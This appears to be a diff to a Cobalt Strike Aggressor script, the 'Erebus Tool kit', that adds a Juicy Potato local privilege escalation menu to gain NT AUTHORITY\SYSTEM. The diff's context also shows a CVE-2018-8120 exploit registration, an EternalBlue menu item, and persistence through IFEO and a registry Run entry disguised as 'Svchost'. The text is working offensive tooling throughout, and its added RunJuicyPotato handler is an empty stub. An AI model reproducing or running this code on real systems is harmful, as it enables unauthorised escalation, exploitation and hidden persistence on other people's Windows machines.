@@ -85,12 +85,30 @@ sub InstallAutoRun{
     bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
 }
 
+sub RunJuicyPotato{
+
+}
+
 
 beacon_exploit_register("Erebus - CVE-2018-8120", "CVE8120", &CVE_2018_8120);
 
 
 popup beacon_bottom{
     menu "Erebus Tool kit"{
+        menu "Local Privilege Escalation"{
+            item "Juicy-Potato"{
+                bshell($1,"JuicyPotato.exe -p payload.cmd -t t -l 1337");
+                $bid = $1['@'];
+                $Dialog = dialog("Juicy Potato",%(Call =>"CreateProcessWithTokenW", Port => "1337", CLSID => "{4991d34b-80a1-4291-83b6-3328366b9097}", bid => $bid),&RunJuicyPotato);
+                dialog_description($Dialog, "A sugared version of RottenPotatoNG, with a bit of juice, i.e. another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\\SYSTEM. ");
+                drow_listener($Dialog, "listener", "Listener: ");
+                drow_text($Dialog, "Call",  "Createprocess Call: ");
+                drow_text($Dialog, "Port", "Listen Port: ");
+                drow_text($Dialog, "CLSID", "CLSID: ");
+                dbutton_action($Dialog, "Exploit");
+                dialog_show($Dialog);
+            }
+        }
         menu "Pwn"{
             item "EternalBlue"{
                 $bid = $1['@'];
@@ -105,7 +123,7 @@ popup beacon_bottom{
             }
         }
         
-        menu "Persistent"{
+        menu "Persistence"{
 
             item "IFEO"{
                 if (!-isadmin $1['@']){
@@ -132,7 +150,7 @@ popup beacon_bottom{
                     $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe",bid => $bid),&InstallAutoRun);
                     dialog_description($Dialog, "Registry Add Boot Start Item");
                     drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
-                    drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunServiceOnce"));
+                    drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx"));
                     drow_text($Dialog, "CallBackFile", "CallBackFile: ");
                     dbutton_action($Dialog, "Reg");
                     dialog_show($Dialog);
